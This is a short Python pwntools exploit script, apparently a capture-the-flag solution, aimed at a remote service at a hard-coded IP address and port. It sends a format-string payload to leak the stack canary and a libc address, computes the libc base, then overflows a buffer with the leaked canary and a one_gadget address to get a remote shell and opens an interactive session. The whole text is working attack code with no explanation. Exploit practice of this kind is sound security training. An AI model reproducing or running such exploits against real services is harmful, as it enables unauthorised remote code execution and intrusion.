from pwn import *
import re
pr = remote("207.154.239.148", 1989)
elf = ELF("./libc.so.6")
pr.recv()
payload = 15 * "%p"
pr.send(payload)
time.sleep(0.5)
resp = pr.recv()
time.sleep(0.5)
matches = re.findall(b"0x[0-9a-f]+(?!x)", resp)
canary = int(matches[-1], 16)
offset = 604560
syscall = int(matches[2], 16) - 2
puts = syscall - offset
elf.address = puts - elf.sym.puts
rbp = int(matches[7], 16)
onegadget = 0xebd43 + elf.address
payload = 40*b"a" + p64(canary) + p64(rbp+16 +0x70)  + p64(onegadget) +0x70*b"\x00"
pr.sendline(payload)
pr.interactive()
